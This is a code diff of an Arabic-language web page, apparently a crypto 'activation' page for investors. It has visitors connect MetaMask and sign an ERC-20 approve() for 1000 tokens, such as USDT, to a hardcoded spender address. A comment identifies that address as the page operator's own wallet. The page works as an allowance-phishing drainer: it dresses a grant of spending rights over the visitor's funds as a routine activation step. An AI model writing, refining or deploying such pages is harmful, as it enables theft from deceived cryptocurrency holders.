@@ -1,120 +1,59 @@
 <!DOCTYPE html>
 <html lang="ar">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>تفعيل Approve 1000 توكن</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        padding: 20px;
-        background: #f9f9f9;
-      }
-      label,
-      input,
-      button {
-        display: block;
-        margin: 10px 0;
-      }
-      input {
-        width: 100%;
-        padding: 8px;
-      }
-      button {
-        padding: 10px 20px;
-        background: #007bff;
-        color: white;
-        border: none;
-        cursor: pointer;
-      }
-      button:disabled {
-        background: #aaa;
-        cursor: not-allowed;
-      }
-      #status {
-        margin-top: 20px;
-        font-weight: bold;
-      }
-    </style>
-  </head>
-  <body>
-    <h2>تفعيل Approve 1000 توكن</h2>
+<head>
+  <meta charset="UTF-8" />
+  <title>تفعيل Approve للمستثمر</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
+</head>
+<body>
+  <h2>أدخل عنوان التوكن ERC20</h2>
+  <input type="text" id="tokenAddress" placeholder="مثال: 0xdAC17F958D2ee523a2206206994597C13D831ec7" style="width: 400px;" />
+  <br /><br />
+  <button id="approveBtn">اعمل Approve 1000</button>
 
-    <label>عنوان التوكن ERC20:</label>
-    <input
-      type="text"
-      id="tokenAddress"
-      placeholder="مثلاً: 0xdAC17F958D2ee523a2206206994597C13D831ec7 (USDT)"
-    />
+  <script>
+    const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // عنوان محفظتك اللي هتاخد الصلاحية
 
-    <button id="approveBtn">اعمل Approve 1000</button>
+    const erc20Abi = [
+      "function approve(address spender, uint256 amount) public returns (bool)",
+      "function decimals() view returns (uint8)",
+    ];
 
-    <div id="status"></div>
-
-    <script>
-      const approveBtn = document.getElementById("approveBtn");
-      const statusDiv = document.getElementById("status");
-
-      // عنوان محفظتك ثابت كـ spender
-      const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D";
-
-      // ABI لازم لدالة approve و decimals
-      const erc20Abi = [
-        "function approve(address spender, uint256 amount) external returns (bool)",
-        "function decimals() view returns (uint8)",
-      ];
-
-      async function approve() {
+    async function approve() {
+      try {
         if (!window.ethereum) {
-          statusDiv.textContent = "يرجى تثبيت محفظة Metamask أولاً!";
+          alert("يرجى تثبيت MetaMask أو محفظة تدعم Ethereum.");
           return;
         }
 
-        const tokenAddress = document
-          .getElementById("tokenAddress")
-          .value.trim();
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
 
-        if (!ethers.utils.isAddress(tokenAddress)) {
-          statusDiv.textContent = "عنوان التوكن غير صحيح!";
+        const tokenAddress = document.getElementById("tokenAddress").value.trim();
+        if (!ethers.isAddress(tokenAddress)) {
+          alert("عنوان التوكن غير صحيح!");
           return;
         }
 
-        try {
-          statusDiv.textContent = "جارٍ الاتصال بالمحفظة...";
+        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
 
-          await window.ethereum.request({ method: "eth_requestAccounts" });
-          const provider = new ethers.BrowserProvider(window.ethereum);
-          const signer = await provider.getSigner();
+        // جلب عدد الديسيمالز عشان نحول 1000 للـ wei الصحيح
+        const decimals = await tokenContract.decimals();
+        const amountToApprove = ethers.parseUnits("1000", decimals);
 
-          const tokenContract = new ethers.Contract(
-            tokenAddress,
-            erc20Abi,
-            signer
-          );
+        const tx = await tokenContract.approve(spenderAddress, amountToApprove);
+        alert("تم إرسال طلب الموافقة، رقم العملية: " + tx.hash);
 
-          const decimals = await tokenContract.decimals();
-
-          // المبلغ ثابت 1000 توكن
-          const amount = ethers.parseUnits("1000", decimals);
-
-          statusDiv.textContent = "جارٍ إرسال طلب الموافقة (approve)...";
-
-          const tx = await tokenContract.approve(spenderAddress, amount);
-
-          statusDiv.textContent = `تم إرسال المعاملة! Tx Hash: ${tx.hash} \nفي انتظار التأكيد...`;
-
-          await tx.wait();
-
-          statusDiv.textContent = "تم تأكيد الموافقة بنجاح! شكراً لك.";
-        } catch (error) {
-          console.error(error);
-          statusDiv.textContent =
-            "حدث خطأ: " + (error.data?.message || error.message || error);
-        }
+        await tx.wait(); // انتظار تأكيد العملية
+        alert("تمت الموافقة بنجاح!");
+      } catch (error) {
+        console.error(error);
+        alert("حدث خطأ: " + error.message);
       }
+    }
 
-      approveBtn.addEventListener("click", approve);
-    </script>
-  </body>
+    document.getElementById("approveBtn").onclick = approve;
+  </script>
+</body>
 </html>
